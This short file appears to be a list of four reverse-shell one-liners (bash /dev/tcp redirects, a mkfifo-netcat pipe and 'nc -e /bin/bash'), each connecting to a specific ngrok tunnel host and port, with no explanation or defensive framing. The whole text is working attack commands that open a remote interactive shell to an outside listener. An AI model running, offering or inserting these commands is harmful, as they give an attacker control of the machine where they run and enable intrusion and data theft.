/bin/bash -i >& /dev/tcp/8.tcp.ngrok.io/12185 0>&1
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 6.tcp.ngrok.io 19545 >/tmp/f
nc 6.tcp.ngrok.io 19545 -e /bin/bash
/bin/bash -i >& /dev/tcp/2.tcp.ngrok.io/19371 0>&1